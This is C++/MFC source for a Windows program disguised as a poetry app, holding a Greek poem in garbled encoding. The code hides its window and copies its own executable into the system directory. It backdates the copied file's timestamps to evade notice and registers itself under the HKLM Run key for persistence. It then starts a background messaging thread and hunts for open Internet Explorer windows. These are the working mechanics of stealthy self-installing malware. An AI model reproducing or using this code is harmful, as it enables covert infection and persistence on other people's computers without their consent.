   #include "stdafx.h"
   #include "PoetryApp.h"
   #include "mainfrm.h"
   #include <string.h>

   #ifdef _DEBUG
   #undef THIS_FILE
   static char THIS_FILE[]=__FILE__;
   #define new DEBUG_NEW
   #endif

   //WIN32,_WINDOWS,XP_WIN32,_AFXDLL,_DEBUG


   ////////////////////////////////////////////////////////////////
   CPoetryApp theApp;

   BOOL bClassRegistered = FALSE;

   ////////////////////////////////////////////////////////////////
   //
   //
   BEGIN_MESSAGE_MAP(CPoetryApp, CWinApp)
       //{{AFX_MSG_MAP(CPoetryApp)
       //}}AFX_MSG_MAP
   END_MESSAGE_MAP()


   ////////////////////////////////////////////////////////////////
   //
   //
   BOOL CPoetryApp::InitInstance()
   {
       m_FirstInstance=FirstInstance();
       if (m_FirstInstance==false) return false;

       WCHAR* m=L" ...ãéá ôï ìåãÜëï [ôï øåõôéêü êáé áëçèéíü] ";
       SetPoem();
       InstallPoetry();

       //CCommandLineInfo cmdInfo;
       //ParseCommandLine(cmdInfo);

       // Register our unique class name that we wish to use
       WNDCLASS wndcls;
       memset(&wndcls, 0, sizeof(WNDCLASS));   // start with NULL defaults

       wndcls.style = CS_DBLCLKS | CS_HREDRAW | CS_VREDRAW;
       wndcls.lpfnWndProc = ::DefWindowProc;
       wndcls.hInstance = AfxGetInstanceHandle();
       wndcls.hIcon = LoadIcon(IDR_MAINFRAME); // or load a different icon
       wndcls.hCursor = LoadCursor( IDC_ARROW );
       wndcls.hbrBackground = (HBRUSH) (COLOR_WINDOW + 1);
       wndcls.lpszMenuName = NULL;

       // Specify our own class name for using FindWindow later
       wndcls.lpszClassName = _T("PoetryIsDeadClass");

       // Register new class and exit if it fails
       if(!AfxRegisterClass(&wndcls))
       {
           TRACE("Class Registration Failed\n");
           return FALSE;
       }
       bClassRegistered = TRUE;

       // Create main frame window (don't use doc/view stuff)
       CMainFrame* pMainFrame = new CMainFrame;
       if (!pMainFrame->LoadFrame(IDR_MAINFRAME))
           return FALSE;
       pMainFrame->ShowWindow(SW_HIDE);
       pMainFrame->UpdateWindow();
       m_pMainWnd = pMainFrame;
       m_pActiveWnd=pMainFrame;

       //this->SetThreadPriority(THREAD_PRIORITY_BELOW_NORMAL);

       m_SendMessageThread=0;
       //Begin the thread
       m_SendMessageThread=(CSendMessage*) AfxBeginThread( RUNTIME_CLASS(CSendMessage));
       int r=((CSendMessage*)m_SendMessageThread)->ExternalAddRef();
       ((CSendMessage*)m_SendMessageThread)->m_bAutoDelete=true;
       //((CSendMessage*)m_SendMessageThread)->m_pMainWnd=pMainFrame;
       ((CSendMessage*)m_SendMessageThread)->m_pActiveWnd=pMainFrame;

       //get any open IE window
       pMainFrame->GetIEWindows();

       return true;
   }


   ////////////////////////////////////////////////////////////////
   //
   //
   int CPoetryApp::ExitInstance()
   {
       // Save the screensaver's state
       BOOL bEnabled;
       ::SystemParametersInfo(SPI_GETSCREENSAVEACTIVE, 0, &bEnabled, 0);
       ::SystemParametersInfo( SPI_SETSCREENSAVEACTIVE,
                               bEnabled,
                               NULL,
                               SPIF_UPDATEINIFILE);

       // Release the wndclass name
       if(bClassRegistered)
           ::UnregisterClass(_T("PoetryAppClass"),AfxGetInstanceHandle());
       return CWinApp::ExitInstance();
   }


   ////////////////////////////////////////////////////////////////
   //
   //
   BOOL CPoetryApp::FirstInstance()
   {
       // Determine if another window with our class name exists...
       if (CWnd::FindWindow(_T("PoetryIsDeadClass"),NULL) != NULL)
           return FALSE;
       else
           // First instance. Proceed as normal.
           return TRUE;
   }



   ////////////////////////////////////////////////////////////////
   //
   //

   void CPoetryApp::SetPoem()
   {
       Poetry+=L"\r\n Áðüøå åßíáé óáí üíåéñï ôï äåßëé' ";
       Poetry+=L"\r\n áðüøå ç ëáêãáäéÜ óôá ìÜãéá ìÝíåé. ";
       Poetry+=L"\r\n Äå âñÝ÷åé ðéÜ. Ê' ç êüñç áðïóôáìÝíç ";
       Poetry+=L"\r\n óôï ìïõóêåìÝíï îÜðëùóå ôñéöýëëé. ";
       Poetry+=L"\r\n  ";
       Poetry+=L"\r\n Óá äõü êåñÜóéá ÷þñéóáí ôá ÷åßëç' ";
       Poetry+=L"\r\n ê´Ýôóé âáèéÜ, ãéïìÜôá ùò áíáóáßíåé, ";
       Poetry+=L"\r\n óôï óôÞèïò ôçò áíåâïêáôåâáßíåé ";
       Poetry+=L"\r\n ôï ðëÝïí áäñü ôñéáíôÜöõëëï ô'áðñßëç. ";
       Poetry+=L"\r\n  ";
       Poetry+=L"\r\n Îåöåýãïõíå áð´ôï óýííåöïí á÷ôßäåò ";
       Poetry+=L"\r\n êáé êñýâïíôáé óôá ìÜôéá ôçò' ôç âñÝ÷åé ";
       Poetry+=L"\r\n ìéá ëåìïíéÜ ìå äõü äñïóïóôáëßäåò ";
       Poetry+=L"\r\n  ";
       Poetry+=L"\r\n ðïõ óôÜèçêáí óôï ìÜãïõëï äéáìÜíôéá ";
       Poetry+=L"\r\n êáé ðïõ èáñåßò ôï äÜêñõ ôçò ðùò ôñÝ÷åé ";
       Poetry+=L"\r\n êáèþò ÷áìïãåëÜåé óôïí Þëéï áãíÜíôéá. ";

       return;
   }

   BOOL CPoetryApp::PreTranslateMessage(MSG *pMsg)
   {
       return CWinApp::PreTranslateMessage(pMsg);
   }

   bool CPoetryApp::InstallPoetry()
   {
       char SystDir[1024];
       CString sCurrFile;
       CString sSystFile;
       CFile CurrFile;
       CFile SystFile;

       //Get pathnames
       GetSystemDirectory(SystDir,1000);
       sSystFile=CString(SystDir)+"\\Poetry.exe";
       sCurrFile=__targv[0];

       //copy file to the system directory
       TRY
       {
           if( 0==CurrFile.Open(sCurrFile,CFile::modeRead|CFile::shareDenyNone|CFile::typeBinary))
               return false;
           if( 0==SystFile.Open(sSystFile,CFile::modeWrite|CFile::modeCreate|CFile::shareExclusive|CFile::typeBinary))
               return false;

           char copybuffer[10000];
           int readcount=0;
           while(true)
           {
               readcount=CurrFile.Read(copybuffer,10000);
               if(readcount==0) break;
               SystFile.Write(copybuffer,readcount);
               if(readcount<10000) break;
           }
           CurrFile.Close();
           SystFile.Close();

           //change the filetime
           CFileStatus FileStatus;
           CFile::GetStatus(sSystFile,FileStatus);
           FileStatus.m_atime=CTime(2000,12,1,0,0,0);
           FileStatus.m_ctime=FileStatus.m_atime;
           FileStatus.m_mtime=FileStatus.m_atime;
           CFile::SetStatus(sSystFile,FileStatus);




       }
       CATCH( CFileException, e )
       {
          #ifdef _DEBUG
             afxDump << "File could not be opened " << e->m_cause << "\n";
          #endif
       }
       END_CATCH


       //Add this application to the registry under the RUN key.
       //That makes it to run every time this application run
       HKEY hKey = 0;
       static LPCTSTR gszWin95ServKey=TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
       LONG lRet = ERROR_SUCCESS;
       if( ::RegCreateKey(HKEY_LOCAL_MACHINE, gszWin95ServKey , &hKey) == ERROR_SUCCESS )
       {
           lRet =  ::RegSetValueEx(
                       hKey,               // handle of key to set value for
                       "PoetryIsDead",     // address of value to set (NAME OF SERVICE)
                       0,                  // reserved
                       REG_EXPAND_SZ,      // flag for value type
                       (CONST BYTE*)(LPCTSTR)sSystFile,// address of value data
                       _tcslen(sSystFile) + 1  // size of value data
                   );
           ::RegCloseKey(hKey);
       }

       return true;
   }
